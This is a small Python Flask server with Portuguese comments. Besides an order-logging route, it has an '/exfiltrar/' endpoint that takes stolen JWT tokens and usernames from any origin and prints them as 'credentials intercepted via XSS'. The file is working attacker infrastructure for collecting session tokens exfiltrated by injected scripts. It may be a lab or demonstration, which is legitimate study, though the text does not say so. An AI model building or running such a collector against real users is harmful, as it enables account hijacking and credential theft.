from flask import Flask, request, jsonify

app = Flask(__name__)

pedidos = []  # lista temporária para armazenar pedidos

@app.after_request
def add_cors_headers(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
    response.headers['Access-Control-Allow-Methods'] = 'POST, GET, OPTIONS'
    return response

@app.route('/pedidos/', methods=['POST'])
def criar_pedido():
    data = request.get_json()
    if not data or 'itens' not in data:
        return jsonify({'error': 'Formato de pedido inválido'}), 400
    
    pedidos.append(data)
    print("Pedido recebido:", data)  # loga no console
    return jsonify({'message': 'Pedido registrado com sucesso!'}), 201

@app.route('/exfiltrar/', methods=['POST', 'GET', 'OPTIONS'])
def exfiltrar():
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'}), 200
    
    token = None
    user = 'Desconhecido'
    
    if request.method == 'POST':
        data = request.get_json(silent=True) or {}
        token = data.get('token')
        user = data.get('user', 'Desconhecido')
        if not token:
            token = request.form.get('token')
            user = request.form.get('user', 'Desconhecido')
    else:
        token = request.args.get('token')
        user = request.args.get('user', 'Desconhecido')
        
    print("\n==================================================")
    print(" [!] CRÍTICO: CREDENCIAIS INTERCEPTADAS VIA XSS")
    print(f" [*] Usuário Vítima: {user}")
    print(f" [*] Token JWT Capturado: {token}")
    print("==================================================\n")
    return jsonify({'status': 'intercepted'}), 200

if __name__ == '__main__':
    # Escuta em todas as interfaces de rede locais (0.0.0.0) na porta 8001
    app.run(host='0.0.0.0', port=8001)
